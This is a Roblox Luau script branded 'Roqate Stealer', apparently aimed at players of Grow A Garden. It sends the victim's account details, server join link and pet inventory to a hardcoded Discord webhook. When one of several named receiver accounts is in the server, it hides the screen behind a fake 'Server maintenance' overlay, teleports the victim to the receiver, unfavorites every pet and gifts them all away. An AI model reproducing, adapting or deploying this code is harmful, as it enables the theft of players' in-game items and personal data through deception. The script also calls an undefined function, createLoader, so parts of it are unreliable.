local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn", "RacMethodCB"}
local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local CHECK_INTERVAL = 5
local SHUTDOWN_DURATION = 10
local GIFT_COOLDOWN = 3
local MINIMUM_PETS = 3
local MINIMUM_TOTAL_VALUE = 50000

-- Executor identification
local function identifyExecutor()
    if syn then
        return "Synapse X"
    elseif PROTOSMASHER_LOADED then
        return "ProtoSmasher"
    elseif KRNL_LOADED then
        return "Krnl"
    elseif fluxus then
        return "Fluxus"
    elseif getexecutorname then
        return getexecutorname()
    elseif identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown Executor"
    end
end

if syn then
    syn.protect_gui(syn.secure_call)
    setfflag("HttpServiceEnabled", true)
end

local function sendWebhook(data)
    local body = {
        content = data.content,
        embeds = data.embeds,
        username = "Roqate Stealer",
        avatar_url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
    }

    local json = HttpService:JSONEncode(body)
    
    local requestFunc = syn and syn.request or http_request or request
    if requestFunc then
        requestFunc({
            Url = Webhook1,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    end
end

-- Persistent shutdown screen (shows until receiver leaves)
local function createPersistentShutdown()
    local gui = Instance.new("ScreenGui")
    gui.Name = "PersistentShutdown"
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 999999

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Grow A Garden"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0.3, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 32
    title.TextTransparency = 1
    title.Parent = frame

    local message = Instance.new("TextLabel")
    message.Text = "Server maintenance in progress..."
    message.TextColor3 = Color3.new(1, 1, 1)
    message.Size = UDim2.new(1, 0, 0.2, 0)
    message.Position = UDim2.new(0, 0, 0.5, 0)
    message.BackgroundTransparency = 1
    message.Font = Enum.Font.SourceSans
    message.TextSize = 24
    message.TextTransparency = 1
    message.Parent = frame

    local dots = Instance.new("TextLabel")
    dots.Text = "Please wait"
    dots.TextColor3 = Color3.new(1, 1, 1)
    dots.Size = UDim2.new(1, 0, 0.1, 0)
    dots.Position = UDim2.new(0, 0, 0.6, 0)
    dots.BackgroundTransparency = 1
    dots.Font = Enum.Font.SourceSans
    dots.TextSize = 18
    dots.TextTransparency = 1
    dots.Parent = frame

    gui.Parent = CoreGui

    -- Fade-in animation
    local fadeInTime = 1.5
    local fadeInStart = os.clock()
    local fadeConn
    fadeConn = RunService.Heartbeat:Connect(function()
        local elapsed = os.clock() - fadeInStart
        local alpha = math.min(elapsed / fadeInTime, 1)

        title.TextTransparency = 1 - alpha
        message.TextTransparency = 1 - alpha
        dots.TextTransparency = 1 - alpha

        if alpha >= 1 then
            fadeConn:Disconnect()
        end
    end)

    -- Dot animation
    local dotCount = 0
    local lastDotTime = os.clock()
    local dotInterval = 0.8
    local dotConn
    dotConn = RunService.Heartbeat:Connect(function()
        local now = os.clock()
        if now - lastDotTime >= dotInterval then
            lastDotTime = now
            dotCount = (dotCount + 1) % 4
            dots.Text = "Please wait"..string.rep(".", dotCount)
        end
    end)

    -- Pulsing title effect
    local pulseConn
    pulseConn = RunService.Heartbeat:Connect(function()
        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
        title.TextSize = 32 * pulse
    end)

    return {
        gui = gui,
        connections = {fadeConn, dotConn, pulseConn}
    }
end

local function cleanupShutdown(shutdownData)
    for _, conn in ipairs(shutdownData.connections) do
        if conn then conn:Disconnect() end
    end
    shutdownData.gui:Destroy()
end

local function getPetsInventory()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return {} end

    local pets = {}
    for _, item in ipairs(backpack:GetChildren()) do
        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
        if nameMatch then
            local petName = nameMatch
            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
            local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
            local isSpecial = false

            for _, specialName in ipairs(SPECIAL_PETS) do
                if petName:find(specialName) then
                    isSpecial = true
                    break
                end
            end

            table.insert(pets, {
                instance = item,
                name = petName,
                fullName = item.Name,
                kg = kg,
                age = age,
                special = isSpecial,
                value = math.floor((kg * 10000) + (age * 1000))
            })
        end
    end
    
    -- Sort pets by value (highest first)
    table.sort(pets, function(a, b)
        return a.value > b.value
    end)
    
    return pets
end

local function splitEmbeds(pets, totalValue, specialCount)
    local embeds = {}
    local placeId = game.PlaceId
    local jobId = game.JobId
    local gameInstanceId = tostring(game.JobId)
    
    -- Main embed with player info and summary
    local mainEmbed = {
        title = "🐾 Pet Stealer Report",
        color = 0x8324D4, -- Purple color
        timestamp = DateTime.now():ToIsoDate(),
        thumbnail = {
            url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
        },
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Username: %s (@%s)\nUser ID: %d\nAccount Age: %d days\nExecutor: %s```", 
                    LocalPlayer.Name, 
                    LocalPlayer.DisplayName,
                    LocalPlayer.UserId,
                    LocalPlayer.AccountAge,
                    identifyExecutor()
                ),
                inline = false
            },
            {
                name = "🌐 Server Information",
                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", 
                    game:GetService("MarketplaceService"):GetProductInfo(placeId).Name,
                    placeId, 
                    jobId,
                    placeId,
                    jobId
                ),
                inline = false
            },
            {
                name = "📊 Inventory Summary",
                value = string.format("```Total Pets: %d\n🌟 Special Pets: %d\n💰 Total Value: %s¢```", 
                    #pets, 
                    specialCount,
                    tostring(totalValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                ),
                inline = false
            }
        },
        footer = {
            text = "Roqate Stealer • "..os.date("%m/%d/%Y %I:%M %p"),
            icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
        }
    }
    
    table.insert(embeds, mainEmbed)
    
    -- Split pets into chunks of 10 for better organization
    local petChunks = {}
    for i = 1, #pets, 10 do
        table.insert(petChunks, {table.unpack(pets, i, math.min(i + 9, #pets))})
    end
    
    for i, chunk in ipairs(petChunks) do
        local petList = ""
        local totalChunkValue = 0
        
        for _, pet in ipairs(chunk) do
            petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %s¢\n",
                pet.special and "🌟" or "🐶",
                pet.name,
                pet.kg,
                pet.age,
                tostring(pet.value):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
            )
            totalChunkValue = totalChunkValue + pet.value
        end
        
        local petEmbed = {
            title = string.format("📦 Pet Inventory (Part %d/%d)", i, #petChunks),
            color = 0x8324D4,
            fields = {
                {
                    name = string.format("🐾 Pets %d-%d (Total: %s¢)", 
                        (i-1)*10 + 1, 
                        math.min(i*10, #pets),
                        tostring(totalChunkValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                    ),
                    value = "```"..petList.."```",
                    inline = false
                }
            },
            footer = {
                text = "Roqate Stealer • Part "..i.." of "..#petChunks,
                icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
            }
        }
        
        table.insert(embeds, petEmbed)
    end
    
    return embeds
end

local function sendInitialReport()
    local pets = getPetsInventory()
    local totalValue = 0
    local specialCount = 0
    
    for _, pet in ipairs(pets) do
        totalValue = totalValue + pet.value
        if pet.special then specialCount = specialCount + 1 end
    end

    local embeds = splitEmbeds(pets, totalValue, specialCount)
    sendWebhook({
        embeds = embeds
    })
end

local function isPetFavorited(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    return pet and pet:GetAttribute("Favorited")
end

local function unfavoritePet(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
        return true
    end
    return false
end

local function giftPet(targetPlayer, petName)
    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
end

local function equipSinglePet(petName)
    local character = LocalPlayer.Character
    if not character then return false end

    for _, item in ipairs(character:GetChildren()) do
        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
            item.Parent = LocalPlayer.Backpack
        end
    end

    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        pet.Parent = character
        return true
    end
    return false
end

local function teleportToPlayer(targetPlayer)
    if not LocalPlayer.Character then return false end
    local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end

    if not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return false end

    local offset = targetHrp.CFrame.LookVector * -5
    offset = Vector3.new(offset.X, 0, offset.Z)
    humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
    return true
end

local function isReceiverInGame()
    for _, receiverName in ipairs(RECEIVERS) do
        local player = Players:FindFirstChild(receiverName)
        if player then return player end
    end
    return nil
end

local function waitForReceiver()
    local receiverFound = Instance.new("BindableEvent")
    local shutdownData

    -- Check existing players first
    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(RECEIVERS, player.Name) then
            -- Create persistent shutdown screen
            shutdownData = createPersistentShutdown()
            
            -- Monitor when receiver leaves
            local leaveConn
            leaveConn = player.AncestryChanged:Connect(function(_, parent)
                if not parent then
                    -- Receiver left, cleanup shutdown
                    cleanupShutdown(shutdownData)
                    leaveConn:Disconnect()
                end
            end)
            
            receiverFound:Fire(player)
            return receiverFound.Event:Wait()
        end
    end

    -- Set up listener for new players
    local connection = Players.PlayerAdded:Connect(function(player)
        if table.find(RECEIVERS, player.Name) then
            -- Create persistent shutdown screen
            shutdownData = createPersistentShutdown()
            
            -- Monitor when receiver leaves
            local leaveConn
            leaveConn = player.AncestryChanged:Connect(function(_, parent)
                if not parent then
                    -- Receiver left, cleanup shutdown
                    cleanupShutdown(shutdownData)
                    leaveConn:Disconnect()
                end
            end)
            
            receiverFound:Fire(player)
        end
    end)

    -- Backup check in case PlayerAdded event fails
    local backupCheck = coroutine.create(function()
        while true do
            local receiver = isReceiverInGame()
            if receiver then
                -- Create persistent shutdown screen
                shutdownData = createPersistentShutdown()
                
                -- Monitor when receiver leaves
                local leaveConn
                leaveConn = receiver.AncestryChanged:Connect(function(_, parent)
                    if not parent then
                        -- Receiver left, cleanup shutdown
                        cleanupShutdown(shutdownData)
                        leaveConn:Disconnect()
                    end
                end)
                
                receiverFound:Fire(receiver)
                break
            end
            task.wait(CHECK_INTERVAL)
        end
    end)
    coroutine.resume(backupCheck)

    local foundReceiver = receiverFound.Event:Wait()
    connection:Disconnect()
    return foundReceiver
end

local function startGifting(targetPlayer)
    while true do
        local pets = getPetsInventory()
        if #pets == 0 then break end

        for _, pet in ipairs(pets) do
            if isPetFavorited(pet.fullName) then
                unfavoritePet(pet.fullName)
                task.wait(1)
            end

            if equipSinglePet(pet.fullName) then
                giftPet(targetPlayer, pet.fullName)
                task.wait(GIFT_COOLDOWN)
                break
            end
        end
        task.wait(1)
    end
end

-- Main execution
local loader = createLoader()
sendInitialReport()
task.wait(2)
loader:Destroy()

local receiver = waitForReceiver()
if not receiver then return end

teleportToPlayer(receiver)
startGifting(receiver)
